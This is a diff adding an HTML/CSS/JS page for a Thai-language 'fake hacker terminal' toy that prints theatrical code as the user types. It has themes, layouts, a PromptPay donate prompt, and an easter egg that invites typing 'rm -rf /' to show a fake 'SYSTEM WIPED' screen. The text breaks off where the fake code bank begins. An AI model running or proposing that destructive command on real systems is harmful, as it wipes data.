@@ -1,0 +1,1689 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NEXUS TYPER — Fake Hacker Terminal</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700;800&family=Major+Mono+Display&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+/* =============================================
+   RESET & ROOT
+============================================= */
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+:root {
+  --bg:#060a06; --bg2:#020402;
+  --fg:#00ff66; --fgd:#007722; --fgb:#c0ffc0;
+  --acc:#ff0044; --warn:#ffb300; --info:#00d4ff;
+  --bdr:rgba(0,255,102,.22); --bdr2:rgba(0,255,102,.5);
+  --panel:rgba(0,255,102,.04);
+}
+body[data-theme="amber"]{--bg:#1a0e00;--bg2:#0a0500;--fg:#ffb000;--fgd:#8a5e00;--fgb:#ffe0a0;--acc:#ff3c00;--info:#ff7700;--bdr:rgba(255,176,0,.22);--bdr2:rgba(255,176,0,.5);--panel:rgba(255,176,0,.04);}
+body[data-theme="ice"]{--bg:#001018;--bg2:#00070c;--fg:#00d4ff;--fgd:#006080;--fgb:#c0f0ff;--acc:#ff00aa;--info:#00ffea;--bdr:rgba(0,212,255,.22);--bdr2:rgba(0,212,255,.5);--panel:rgba(0,212,255,.04);}
+body[data-theme="blood"]{--bg:#100000;--bg2:#080000;--fg:#ff2a2a;--fgd:#800000;--fgb:#ffb0b0;--acc:#ffea00;--info:#ff8800;--bdr:rgba(255,42,42,.22);--bdr2:rgba(255,42,42,.5);--panel:rgba(255,42,42,.04);}
+body[data-theme="vapor"]{--bg:#0d0420;--bg2:#060118;--fg:#ff71ce;--fgd:#7a3a82;--fgb:#fff0ff;--acc:#01cdfe;--info:#b967ff;--bdr:rgba(255,113,206,.22);--bdr2:rgba(255,113,206,.5);--panel:rgba(255,113,206,.04);}
+body[data-theme="ghost"]{--bg:#0a0a0a;--bg2:#050505;--fg:#e0e0e0;--fgd:#555;--fgb:#fff;--acc:#ff0044;--info:#00d4ff;--bdr:rgba(224,224,224,.18);--bdr2:rgba(224,224,224,.5);--panel:rgba(255,255,255,.03);}
+
+html,body{ width:100vw; height:100vh; overflow:hidden; background:var(--bg2); color:var(--fg); font-family:'JetBrains Mono','Share Tech Mono',monospace; }
+
+@keyframes blink{ 50%{opacity:0} }
+@keyframes scanline{ 0%{top:-100%} 100%{top:100%} }
+@keyframes fadeIn{ from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:none} }
+@keyframes glitch{
+  0%,100%{transform:translate(0);text-shadow:2px 0 var(--info),-2px 0 var(--acc)}
+  25%{transform:translate(-2px,1px)}
+  50%{transform:translate(2px,-1px)}
+  75%{transform:translate(-1px,2px)}
+}
+@keyframes popIn{
+  0%{transform:scale(.5);opacity:0}
+  60%{transform:scale(1.06)}
+  100%{transform:scale(1);opacity:1}
+}
+@keyframes popOut{ to{transform:scale(.9);opacity:0} }
+@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
+@keyframes screenFlicker{ 0%,100%{opacity:1} 49.5%,50.5%{opacity:.95} }
+
+/* CRT overlay */
+body::before{
+  content:''; position:fixed; inset:0; pointer-events:none; z-index:1000;
+  background:repeating-linear-gradient(0deg,rgba(0,0,0,.14) 0,rgba(0,0,0,.14) 1px,transparent 1px,transparent 3px);
+}
+body::after{
+  content:''; position:fixed; inset:0; pointer-events:none; z-index:999;
+  background:radial-gradient(ellipse at 50% 50%,transparent 55%,rgba(0,0,0,.65) 100%);
+}
+body{ animation:screenFlicker 7s infinite; }
+
+/* =============================================
+   SCREEN MANAGER
+============================================= */
+.screen{ position:fixed; inset:0; display:none; }
+.screen.active{ display:flex; flex-direction:column; }
+
+/* =============================================
+   INTRO SCREEN
+============================================= */
+#introScreen{
+  background:var(--bg2);
+  align-items:center;
+  justify-content:flex-start;
+  overflow-y:auto;
+  padding:32px 20px 48px;
+  gap:0;
+}
+#introScreen::-webkit-scrollbar{ width:4px }
+#introScreen::-webkit-scrollbar-thumb{ background:var(--fgd) }
+
+.intro-header{
+  text-align:center; margin-bottom:36px; width:100%; max-width:900px; align-self:center;
+}
+.intro-logo{
+  font-family:'Major Mono Display',monospace;
+  font-size:clamp(24px,5vw,52px);
+  letter-spacing:6px;
+  color:var(--fgb);
+  text-shadow:0 0 20px var(--fg),0 0 40px var(--fg);
+  animation:glitch 4s infinite;
+  margin-bottom:10px;
+}
+.intro-sub{
+  font-size:11px; color:var(--fgd); letter-spacing:4px;
+}
+.intro-sub span{ color:var(--acc); }
+
+.config-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+  gap:16px;
+  width:100%; max-width:900px; align-self:center;
+  margin-bottom:20px;
+}
+.cfg-card{
+  background:var(--bg);
+  border:1px solid var(--bdr);
+  padding:20px;
+  transition:border-color .2s, box-shadow .2s;
+}
+.cfg-card:hover{ border-color:var(--bdr2); }
+.cfg-title{
+  font-size:9px; letter-spacing:3px; color:var(--fgd);
+  text-transform:uppercase; margin-bottom:14px;
+  border-bottom:1px dashed var(--bdr);
+  padding-bottom:7px;
+}
+.cfg-title::before{ content:'// '; color:var(--acc); }
+
+.opt-grid{ display:grid; grid-template-columns:1fr 1fr; gap:6px; }
+.opt-grid.cols3{ grid-template-columns:1fr 1fr 1fr; }
+.opt-btn{
+  background:transparent; border:1px solid var(--bdr);
+  color:var(--fgd); padding:9px 6px; font-family:inherit;
+  font-size:9px; letter-spacing:1px; cursor:pointer;
+  transition:all .15s; text-align:center; text-transform:uppercase;
+  user-select:none;
+}
+.opt-btn:hover{ color:var(--fg); border-color:var(--fg); background:var(--panel); }
+.opt-btn.sel{
+  color:var(--bg2); background:var(--fg);
+  border-color:var(--fg); box-shadow:0 0 12px var(--fg);
+}
+
+/* preview band */
+.theme-preview{
+  display:flex; align-items:center; gap:10px;
+  margin-top:2px; padding:4px 0;
+}
+.tp-dot{ width:10px; height:10px; border-radius:50%; flex-shrink:0; }
+.tp-label{ font-size:9px; letter-spacing:1px; text-transform:uppercase; }
+
+/* speed row */
+.speed-row{
+  display:flex; align-items:center; gap:10px;
+  margin-top:4px;
+}
+.speed-row input[type=range]{
+  flex:1; -webkit-appearance:none; appearance:none;
+  height:2px; background:var(--bdr2); cursor:pointer;
+}
+.speed-row input[type=range]::-webkit-slider-thumb{
+  -webkit-appearance:none; width:12px; height:12px;
+  background:var(--fg); border:1px solid var(--bg2);
+  box-shadow:0 0 8px var(--fg); cursor:pointer;
+}
+.speed-lbl{ font-size:9px; color:var(--fgb); min-width:32px; text-align:right; }
+
+/* toggle */
+.tog-row{
+  display:flex; align-items:center; justify-content:space-between;
+  padding:6px 0; font-size:10px; color:var(--fg);
+  border-bottom:1px dashed var(--bdr);
+}
+.tog-row:last-child{ border:none; }
+.tog{
+  position:relative; width:34px; height:16px;
+  background:var(--bg2); border:1px solid var(--bdr2); cursor:pointer;
+  flex-shrink:0;
+}
+.tog::after{
+  content:''; position:absolute; top:2px; left:2px;
+  width:10px; height:10px; background:var(--fgd); transition:all .2s;
+}
+.tog.on::after{ left:20px; background:var(--fg); box-shadow:0 0 8px var(--fg); }
+
+/* DONATE card */
+.donate-card{
+  background:var(--bg);
+  border:1px solid var(--acc);
+  padding:24px;
+  width:100%; max-width:900px; align-self:center;
+  margin-bottom:20px;
+  display:flex; gap:24px; flex-wrap:wrap; align-items:flex-start;
+}
+.donate-left{ flex:1; min-width:200px; }
+.donate-title{
+  font-family:'Major Mono Display',monospace;
+  font-size:20px; letter-spacing:4px; color:var(--acc);
+  margin-bottom:8px;
+}
+.donate-desc{
+  font-size:10px; color:var(--fgd); line-height:1.8;
+  margin-bottom:16px;
+}
+.donate-desc b{ color:var(--fgb); font-weight:400; }
+.donate-qr-wrap{
+  background:white; padding:12px;
+  display:flex; justify-content:center; align-items:center;
+  flex-shrink:0; width:160px; height:160px;
+}
+.donate-qr-wrap svg{ width:136px; height:136px; }
+
+/* START BUTTON */
+.start-wrap{
+  width:100%; max-width:900px; align-self:center;
+  margin-bottom:16px;
+}
+.start-btn{
+  width:100%;
+  background:transparent;
+  border:1px solid var(--fg);
+  color:var(--fg);
+  padding:18px;
+  font-family:'Major Mono Display',monospace;
+  font-size:18px;
+  letter-spacing:6px;
+  cursor:pointer;
+  transition:all .2s;
+  text-transform:uppercase;
+  box-shadow:0 0 20px var(--fg), inset 0 0 20px rgba(0,255,102,.05);
+  animation:pulse 2s infinite;
+}
+.start-btn:hover{
+  background:var(--fg); color:var(--bg2);
+  box-shadow:0 0 40px var(--fg);
+  animation:none;
+}
+
+/* =============================================
+   TYPER SCREEN
+============================================= */
+#typerScreen{ background:var(--bg2); flex-direction:column; }
+
+/* Top bar */
+.topbar{
+  flex:0 0 32px; display:flex; align-items:center;
+  background:var(--bg2); border-bottom:1px solid var(--bdr2);
+  padding:0 12px; gap:14px; font-size:9px; letter-spacing:1px; z-index:50;
+}
+.tlogo{
+  font-family:'Major Mono Display',monospace;
+  font-size:13px; letter-spacing:5px;
+  color:var(--fgb); text-shadow:0 0 10px var(--fg);
+}
+.tlogo em{ font-style:normal; color:var(--acc); }
+.tbinfo{ display:flex; gap:14px; color:var(--fgd); font-size:9px; margin-left:auto; }
+.tbinfo b{ color:var(--fg); font-weight:400; }
+.auto-ind{
+  color:var(--acc); border:1px solid var(--acc);
+  padding:1px 6px; font-size:8px; letter-spacing:2px;
+  display:none; animation:pulse 1s infinite;
+}
+.auto-ind.on{ display:inline-block; }
+.menu-btn{
+  background:transparent; border:none; color:var(--fg);
+  font-family:inherit; font-size:14px; cursor:pointer;
+  padding:0 4px; display:none;
+}
+@media(max-width:640px){ .menu-btn{display:block} .tbinfo{display:none} }
+
+/* Sidebar */
+.sidebar{
+  position:fixed; top:32px; bottom:24px; left:0;
+  width:230px; background:var(--bg2);
+  border-right:1px solid var(--bdr);
+  padding:14px 12px; z-index:40; overflow-y:auto;
+  transition:transform .3s cubic-bezier(.7,.1,.3,1);
+}
+.sidebar::-webkit-scrollbar{ width:3px }
+.sidebar::-webkit-scrollbar-thumb{ background:var(--fgd) }
+.sidebar.off{ transform:translateX(-100%) }
+
+.sb-sec{ margin-bottom:20px; }
+.sb-ttl{
+  font-size:8px; letter-spacing:3px; color:var(--fgd);
+  text-transform:uppercase; margin-bottom:10px;
+  border-bottom:1px dashed var(--bdr); padding-bottom:5px;
+}
+.sb-ttl::before{ content:'> '; color:var(--acc); }
+.g2{ display:grid; grid-template-columns:1fr 1fr; gap:5px; }
+.g3{ display:grid; grid-template-columns:1fr 1fr 1fr; gap:4px; }
+.sb-btn{
+  background:transparent; border:1px solid var(--bdr);
+  color:var(--fgd); padding:7px 4px; font-family:inherit;
+  font-size:8px; cursor:pointer; transition:all .15s;
+  text-align:center; letter-spacing:1px; text-transform:uppercase;
+  user-select:none;
+}
+.sb-btn:hover{ color:var(--fg); border-color:var(--fg); background:var(--panel); }
+.sb-btn.on{ color:var(--bg2); background:var(--fg); border-color:var(--fg); box-shadow:0 0 10px var(--fg); }
+
+.kh{ font-size:8px; color:var(--fgd); line-height:2; }
+.kh kbd{
+  display:inline-block; background:var(--panel);
+  border:1px solid var(--bdr2);
+  padding:0 4px; font-family:inherit; font-size:8px;
+  color:var(--fg); min-width:32px; text-align:center; margin-right:4px;
+}
+.sb-donate-btn{
+  width:100%; background:transparent; border:1px solid var(--acc);
+  color:var(--acc); padding:10px; font-family:inherit; font-size:9px;
+  cursor:pointer; letter-spacing:2px; transition:all .2s; text-transform:uppercase; margin-top:6px;
+}
+.sb-donate-btn:hover{ background:var(--acc); color:var(--bg2); box-shadow:0 0 16px var(--acc); }
+
+.sb-tog{
+  position:fixed; top:38px; left:238px;
+  background:var(--bg2); border:1px solid var(--bdr2);
+  color:var(--fg); width:22px; height:22px;
+  cursor:pointer; font-family:inherit; z-index:45;
+  transition:left .3s cubic-bezier(.7,.1,.3,1); font-size:12px;
+}
+.sb-tog.off{ left:8px; }
+.sb-tog:hover{ background:var(--panel); }
+
+/* Main area */
+.main-area{
+  flex:1; overflow:hidden;
+  margin-left:230px; position:relative;
+  transition:margin-left .3s cubic-bezier(.7,.1,.3,1);
+}
+.main-area.full{ margin-left:0; }
+
+.layout-wrap{
+  position:absolute; inset:0;
+  display:grid; gap:1px; background:var(--bdr);
+}
+.layout-wrap.L1{ grid-template-columns:1fr; }
+.layout-wrap.L2{ grid-template-columns:1fr 1fr; }
+.layout-wrap.L3{ grid-template-columns:2fr 1fr; grid-template-rows:1fr 1fr; }
+.layout-wrap.L3 .pane:first-child{ grid-row:span 2; }
+.layout-wrap.L4{ grid-template-columns:1fr 1fr; grid-template-rows:1fr 1fr; }
+
+.pane{ background:var(--bg2); overflow:hidden; display:flex; flex-direction:column; }
+.ph{
+  flex:0 0 auto; padding:3px 10px;
+  background:var(--panel); border-bottom:1px solid var(--bdr);
+  font-size:8px; color:var(--fgd); display:flex; justify-content:space-between;
+  letter-spacing:1px;
+}
+.ph .fn{ color:var(--fgb); }
+.ph .pd{ color:var(--acc); margin-right:3px; }
+.pb{
+  flex:1; overflow-y:auto; overflow-x:hidden;
+  padding:10px 14px 60px; font-size:13px;
+  line-height:1.55; white-space:pre-wrap; word-break:break-all;
+  color:var(--fg); text-shadow:0 0 2px currentColor;
+}
+.pb::-webkit-scrollbar{ width:3px }
+.pb::-webkit-scrollbar-thumb{ background:var(--fgd) }
+.pb .cur{
+  display:inline-block; width:7px; height:14px;
+  background:var(--fg); vertical-align:middle;
+  animation:blink 1s steps(2) infinite;
+  box-shadow:0 0 6px var(--fg);
+}
+/* aux pane styles */
+.pb.fs-pane{ font-size:10px; }
+.pb.fs-pane .dir{ color:var(--info); }
+.pb.fs-pane .ok-c{ color:var(--fg); }
+.pb.fs-pane .err-c{ color:var(--acc); }
+.pb.fs-pane .ext-c{ color:var(--warn); }
+.pb.prog-pane{ font-size:10px; }
+.prog-row{ display:flex; align-items:center; gap:8px; margin-bottom:7px; }
+.prog-lbl{ width:120px; color:var(--fgd); font-size:9px; }
+.prog-bar{ flex:1; height:7px; background:var(--bg); border:1px solid var(--bdr); overflow:hidden; }
+.prog-bar-inner{ height:100%; background:var(--fg); box-shadow:0 0 6px var(--fg); transition:width .2s; }
+.prog-pct{ width:36px; text-align:right; color:var(--fg); font-size:9px; }
+.pb.net-pane{ padding:10px 14px; }
+.net-log{ font-size:9px; margin-top:8px; color:var(--fgd); line-height:1.9; }
+
+/* token colors */
+.k{ color:var(--acc); }
+.s{ color:var(--warn); }
+.n{ color:var(--info); }
+.c{ color:var(--fgd); font-style:italic; }
+
+/* Status bar */
+.statusbar{
+  flex:0 0 24px; display:flex; align-items:center;
+  background:var(--fg); color:var(--bg2);
+  padding:0 14px; font-size:8px; font-weight:600;
+  letter-spacing:1.5px; gap:12px; z-index:50;
+}
+.statusbar .r{ margin-left:auto; display:flex; gap:12px; }
+.sp::before{ content:'● '; animation:pulse 1.5s infinite; }
+
+/* HIDDEN INPUT — keyboard capture trick */
+#keyCapture{
+  position:fixed; left:-9999px; top:0;
+  width:1px; height:1px; opacity:0;
+  font-size:16px; /* prevent iOS zoom */
+  border:none; background:transparent; color:transparent;
+  outline:none; caret-color:transparent;
+}
+
+/* =============================================
+   POPUP WINDOWS
+============================================= */
+.popup{
+  position:fixed; background:var(--bg2);
+  border:1px solid var(--acc);
+  box-shadow:0 0 28px var(--acc),0 0 60px rgba(255,0,68,.25);
+  z-index:600; min-width:270px; max-width:88vw;
+  animation:popIn .25s cubic-bezier(.6,.1,.4,1.4);
+}
+.popup.pa{ border-color:var(--fg); box-shadow:0 0 28px var(--fg); }
+.popup.pw{ border-color:var(--warn); box-shadow:0 0 28px var(--warn); }
+.popup.pi{ border-color:var(--info); box-shadow:0 0 28px var(--info); }
+.popup.closing{ animation:popOut .15s forwards; }
+.pbar{
+  background:var(--acc); color:var(--bg2);
+  padding:4px 10px; font-size:8px; letter-spacing:2px;
+  cursor:move; display:flex; justify-content:space-between; font-weight:700;
+  user-select:none;
+}
+.popup.pa .pbar{ background:var(--fg); }
+.popup.pw .pbar{ background:var(--warn); }
+.popup.pi .pbar{ background:var(--info); }
+.px{ cursor:pointer; padding:0 4px; }
+.px:hover{ opacity:.7; }
+.pbody{ padding:20px 24px; }
+.ptitle{
+  font-family:'Major Mono Display',monospace;
+  font-size:20px; letter-spacing:4px; color:var(--acc);
+  margin-bottom:10px; animation:glitch .4s infinite;
+}
+.popup.pa .ptitle{ color:var(--fgb); }
+.popup.pw .ptitle{ color:var(--warn); }
+.popup.pi .ptitle{ color:var(--info); }
+.ptext{ font-size:10px; color:var(--fg); line-height:1.7; letter-spacing:1px; }
+.pprog{ margin-top:12px; color:var(--fgb); font-size:10px; }
+.pstat{ display:grid; grid-template-columns:auto 1fr; gap:5px 14px; margin-top:10px; font-size:9px; }
+.pstat b{ color:var(--fgb); font-weight:400; }
+
+/* glitch flash */
+.gflash{
+  position:fixed; inset:0; pointer-events:none; z-index:700;
+  opacity:0;
+}
+@keyframes gf{ 0%{opacity:0}20%{opacity:.7}45%{opacity:.1}65%{opacity:.4}100%{opacity:0} }
+.gflash.fire{ animation:gf .3s forwards; }
+
+/* rm -rf easter egg */
+.rmrf{
+  position:fixed; inset:0; background:var(--bg2);
+  z-index:800; display:none;
+  flex-direction:column; align-items:center; justify-content:center;
+  animation:glitch .08s infinite;
+}
+.rmrf.on{ display:flex; }
+.rmrf-t{
+  font-family:'Major Mono Display',monospace;
+  font-size:clamp(28px,8vw,56px); color:var(--acc);
+  letter-spacing:8px; text-align:center;
+  text-shadow:0 0 20px var(--acc),4px 0 var(--info),-4px 0 var(--warn);
+  margin-bottom:20px;
+}
+.rmrf-s{ color:var(--fg); font-size:13px; line-height:2; text-align:center; }
+.rmrf-s .d{ color:var(--acc); }
+
+/* QR overlay */
+.qr-ov{
+  position:fixed; inset:0; background:rgba(0,0,0,.9);
+  z-index:900; display:none; align-items:center; justify-content:center;
+  padding:20px; backdrop-filter:blur(4px);
+}
+.qr-ov.on{ display:flex; }
+.qr-box{
+  background:var(--bg2); border:1px solid var(--fg);
+  padding:28px; max-width:360px; width:100%;
+  box-shadow:0 0 40px var(--fg); position:relative;
+}
+.qr-box h2{
+  font-family:'Major Mono Display',monospace;
+  font-size:18px; letter-spacing:4px; color:var(--fgb); margin-bottom:6px;
+}
+.qr-box .qsub{ color:var(--fgd); font-size:9px; letter-spacing:2px; margin-bottom:20px; }
+.qr-img{ background:white; padding:12px; display:flex; justify-content:center; margin-bottom:12px; }
+.qr-img svg{ width:200px; height:200px; display:block; }
+.qr-info{ font-size:10px; color:var(--fg); text-align:center; line-height:1.7; }
+.qr-info b{ color:var(--fgb); }
+.qr-info small{ color:var(--fgd); display:block; margin-top:6px; font-size:8px; }
+.qr-close{
+  position:absolute; top:6px; right:10px;
+  background:transparent; border:none; color:var(--fg);
+  font-size:18px; cursor:pointer; font-family:inherit;
+}
+.qr-close:hover{ color:var(--acc); }
+
+/* particle canvas */
+#pCanvas{ position:fixed; inset:0; pointer-events:none; z-index:500; }
+
+/* =============================================
+   BOOT SCREEN
+============================================= */
+#bootScreen{
+  background:var(--bg2); z-index:5000;
+  display:flex; flex-direction:column;
+  padding:40px; font-size:12px; line-height:1.8;
+  overflow:hidden;
+}
+.bl{ opacity:0; animation:fadeIn .05s forwards; }
+.bl .ok{ color:var(--fgb); }
+.bl .wn{ color:var(--warn); }
+.bl .er{ color:var(--acc); }
+.bcur{
+  display:inline-block; width:8px; height:13px;
+  background:var(--fg); vertical-align:middle;
+  animation:blink .7s steps(2) infinite;
+}
+
+/* responsive */
+@media(max-width:640px){
+  .sidebar{ width:200px; }
+  .main-area{ margin-left:0; }
+  .sb-tog{ display:none; }
+  .layout-wrap.L2,.layout-wrap.L3,.layout-wrap.L4{
+    grid-template-columns:1fr; grid-template-rows:1fr;
+  }
+  .layout-wrap.L3 .pane:not(:first-child),
+  .layout-wrap.L4 .pane:not(:first-child){ display:none; }
+  .pb{ font-size:12px; }
+}
+</style>
+</head>
+<body data-theme="green">
+
+<!-- ============ BOOT SCREEN ============ -->
+<div class="screen active" id="bootScreen"></div>
+
+<!-- ============ INTRO / CONFIG SCREEN ============ -->
+<div class="screen" id="introScreen">
+
+  <div class="intro-header">
+    <div class="intro-logo">N3XUS TYPER</div>
+    <div class="intro-sub">// ตั้งค่าก่อนเริ่ม — <span>เลือกลุค แล้วกด LAUNCH</span></div>
+  </div>
+
+  <div class="config-grid">
+
+    <!-- LANGUAGE -->
+    <div class="cfg-card">
+      <div class="cfg-title">ภาษาโค้ด</div>
+      <div class="opt-grid" id="langGrid">
+        <button class="opt-btn sel" data-lang="js">JS / Node</button>
+        <button class="opt-btn" data-lang="py">Python</button>
+        <button class="opt-btn" data-lang="cpp">C++ / Sys</button>
+        <button class="opt-btn" data-lang="rust">Rust</button>
+        <button class="opt-btn" data-lang="sql">SQL</button>
+        <button class="opt-btn" data-lang="bash">Bash / SH</button>
+        <button class="opt-btn" data-lang="matrix">Matrix</button>
+        <button class="opt-btn" data-lang="html">HTML</button>
+      </div>
+    </div>
+
+    <!-- THEME -->
+    <div class="cfg-card">
+      <div class="cfg-title">ธีมสี</div>
+      <div style="display:flex;flex-direction:column;gap:7px" id="themeGrid">
+        <button class="opt-btn sel" data-theme="green" style="display:flex;align-items:center;gap:8px;justify-content:flex-start;padding:8px 12px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#00ff66;flex-shrink:0"></span>
+          <span>GREEN — matrix classic</span>
+        </button>
+        <button class="opt-btn" data-theme="amber" style="display:flex;align-items:center;gap:8px;justify-content:flex-start;padding:8px 12px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#ffb000;flex-shrink:0"></span>
+          <span>AMBER — retro monitor</span>
+        </button>
+        <button class="opt-btn" data-theme="ice" style="display:flex;align-items:center;gap:8px;justify-content:flex-start;padding:8px 12px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#00d4ff;flex-shrink:0"></span>
+          <span>ICE — cyberpunk blue</span>
+        </button>
+        <button class="opt-btn" data-theme="blood" style="display:flex;align-items:center;gap:8px;justify-content:flex-start;padding:8px 12px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#ff2a2a;flex-shrink:0"></span>
+          <span>BLOOD — red alert</span>
+        </button>
+        <button class="opt-btn" data-theme="vapor" style="display:flex;align-items:center;gap:8px;justify-content:flex-start;padding:8px 12px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#ff71ce;flex-shrink:0"></span>
+          <span>VAPOR — vaporwave</span>
+        </button>
+        <button class="opt-btn" data-theme="ghost" style="display:flex;align-items:center;gap:8px;justify-content:flex-start;padding:8px 12px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#e0e0e0;flex-shrink:0"></span>
+          <span>GHOST — monochrome</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- LAYOUT + SPEED + MISC -->
+    <div class="cfg-card">
+      <div class="cfg-title">รูปแบบหน้าจอ</div>
+      <div class="opt-grid" id="layoutGrid" style="margin-bottom:18px">
+        <button class="opt-btn sel" data-layout="L1">▢ เดี่ยว</button>
+        <button class="opt-btn" data-layout="L2">▢▢ คู่</button>
+        <button class="opt-btn" data-layout="L3">3 จอ</button>
+        <button class="opt-btn" data-layout="L4">4 จอ</button>
+      </div>
+      <div class="cfg-title">ความเร็วพิมพ์</div>
+      <div class="speed-row" style="margin-bottom:18px">
+        <input type="range" id="cfgSpeed" min="1" max="14" value="4">
+        <span class="speed-lbl" id="cfgSpeedLbl">4</span>
+      </div>
+      <div class="cfg-title">ตัวเลือกเพิ่มเติม</div>
+      <div class="tog-row">
+        <span>เสียงคีย์บอร์ด mechanical</span>
+        <div class="tog" id="cfgSound"></div>
+      </div>
+      <div class="tog-row">
+        <span>เปิด Autopilot ทันที</span>
+        <div class="tog" id="cfgAuto"></div>
+      </div>
+    </div>
+
+  </div><!-- /config-grid -->
+
+  <!-- DONATE -->
+  <div class="donate-card" id="donateCard">
+    <div class="donate-left">
+      <div class="donate-title">SUPPORT</div>
+      <div class="donate-desc">
+        // ถ้าเว็บนี้ทำให้คุณดูเป็น<b>แฮ็กเกอร์</b>ได้<br>
+        // ช่วยบริจาคกาแฟซักแก้วให้ผู้สร้างด้วยนะครับ ☕<br>
+        // สแกน QR หรือโอนผ่าน <b>PromptPay</b><br>
+        <br>
+        <span style="color:var(--fgd);font-size:9px">// แก้ไข DONATE_URL ใน JS เพื่อใช้เบอร์ของคุณเอง</span>
+      </div>
+    </div>
+    <div class="donate-qr-wrap" id="introQrWrap"></div>
+  </div>
+
+  <!-- LAUNCH -->
+  <div class="start-wrap">
+    <button class="start-btn" id="launchBtn">[ LAUNCH TERMINAL ]</button>
+  </div>
+
+</div><!-- /introScreen -->
+
+<!-- ============ TYPER SCREEN ============ -->
+<div class="screen" id="typerScreen">
+
+  <!-- top bar -->
+  <div class="topbar">
+    <div class="tlogo">N<em>3</em>XUS</div>
+    <div class="auto-ind" id="autoInd">AUTO</div>
+    <div class="tbinfo">
+      <span>CPU: <b id="cpu">--%</b></span>
+      <span>MEM: <b id="mem">--%</b></span>
+      <span>NET: <b class="sp" style="font-size:8px">online</b></span>
+      <span>UTC: <b id="clk">--:--:--</b></span>
+    </div>
+    <button class="menu-btn" id="menuBtn" onclick="toggleSidebar()">☰</button>
+  </div>
+
+  <!-- sidebar -->
+  <div class="sidebar" id="sidebar">
+    <div class="sb-sec">
+      <div class="sb-ttl">ภาษา</div>
+      <div class="g2" id="sbLangGrid"></div>
+    </div>
+    <div class="sb-sec">
+      <div class="sb-ttl">ธีม</div>
+      <div class="g3" id="sbThemeGrid">
+        <button class="sb-btn" data-t="green">GREEN</button>
+        <button class="sb-btn" data-t="amber">AMBER</button>
+        <button class="sb-btn" data-t="ice">ICE</button>
+        <button class="sb-btn" data-t="blood">BLOOD</button>
+        <button class="sb-btn" data-t="vapor">VAPOR</button>
+        <button class="sb-btn" data-t="ghost">GHOST</button>
+      </div>
+    </div>
+    <div class="sb-sec">
+      <div class="sb-ttl">Layout</div>
+      <div class="g2" id="sbLayoutGrid">
+        <button class="sb-btn" data-l="L1">▢ เดี่ยว</button>
+        <button class="sb-btn" data-l="L2">▢▢ คู่</button>
+        <button class="sb-btn" data-l="L3">3 จอ</button>
+        <button class="sb-btn" data-l="L4">4 จอ</button>
+      </div>
+    </div>
+    <div class="sb-sec">
+      <div class="sb-ttl">ปุ่มลัด</div>
+      <div class="kh">
+        <kbd>1-8</kbd> popup<br>
+        <kbd>ENTER</kbd> popup สุ่ม<br>
+        <kbd>SPACE</kbd> ระเบิด<br>
+        <kbd>ALT</kbd> DENIED<br>
+        <kbd>Ctrl+E</kbd> autopilot<br>
+        <kbd>Ctrl+L</kbd> เปลี่ยน layout<br>
+        <kbd>CAPS</kbd> เปลี่ยนธีม<br>
+        <kbd>TAB</kbd> เปลี่ยนภาษา<br>
+        <kbd>ESC</kbd> ล้างจอ / config<br>
+      </div>
+    </div>
+    <div class="sb-sec">
+      <button class="sb-donate-btn" onclick="showQR()">[ DONATE ☕ ]</button>
+    </div>
+    <div style="text-align:center;font-size:8px;color:var(--fgd);margin-top:8px">
+      // ลองพิมพ์ rm -rf /
+    </div>
+  </div>
+
+  <button class="sb-tog" id="sbTog" onclick="toggleSidebar()">≡</button>
+
+  <!-- main code area -->
+  <div class="main-area" id="mainArea">
+    <div class="layout-wrap L1" id="layoutWrap"></div>
+  </div>
+
+  <!-- status bar -->
+  <div class="statusbar">
+    <div class="sp">CONNECTED</div>
+    <div>LANG: <span id="stLang">js</span></div>
+    <div>UTF-8</div>
+    <div class="r">
+      <span>KEYS: <span id="stKeys">0</span></span>
+      <span>POPUPS: <span id="stPopups">0</span></span>
+      <span>UPTIME: <span id="stUp">00:00</span></span>
+    </div>
+  </div>
+
+</div><!-- /typerScreen -->
+
+<!-- HIDDEN INPUT — the real keyboard capture -->
+<input id="keyCapture" type="text" autocomplete="off" autocorrect="off"
+       autocapitalize="off" spellcheck="false" aria-hidden="true">
+
+<!-- glitch flash -->
+<div class="gflash" id="gflash"></div>
+
+<!-- rm -rf easter egg -->
+<div class="rmrf" id="rmrf">
+  <div class="rmrf-t">SYSTEM<br>WIPED</div>
+  <div class="rmrf-s">
+    <span class="d">[CRIT]</span> root filesystem destroyed<br>
+    <span class="d">[CRIT]</span> kernel panic — not syncing<br>
+    <span class="d">[CRIT]</span> all data lost permanently<br><br>
+    <small style="color:var(--fgd)">// just kidding 😈 — กด ESC เพื่อกลับ</small>
+  </div>
+</div>
+
+<!-- QR modal -->
+<div class="qr-ov" id="qrOv">
+  <div class="qr-box">
+    <button class="qr-close" onclick="hideQR()">✕</button>
+    <h2>SUPPORT</h2>
+    <div class="qsub">// ขอบคุณที่สนับสนุนผู้สร้าง</div>
+    <div class="qr-img" id="qrImg"></div>
+    <div class="qr-info">
+      บริจาคผ่าน <b>PromptPay</b><br>
+      <small>// แก้ DONATE_URL ใน JS ให้เป็นเบอร์ของคุณ</small>
+    </div>
+  </div>
+</div>
+
+<canvas id="pCanvas"></canvas>
+
+<script>
+/* ============================================================
+   NEXUS TYPER v3 — Keyboard fix via hidden <input>
+   ============================================================ */
+
+// ========== CONFIG ==========
+// แก้เบอร์ PromptPay ตรงนี้เลย ↓
+const DONATE_URL = 'https://promptpay.io/0812345678'; // ← เปลี่ยนเบอร์
+
+// ========== CODE BANK ==========
+// ========== CODE BANK (plain strings — no template literals to avoid JS parse errors) ==========
+const CODES = {
+js: '// payload delivery system v5.0\n'
+  + 'import { Cipher } from \'@core/crypto\';\n'
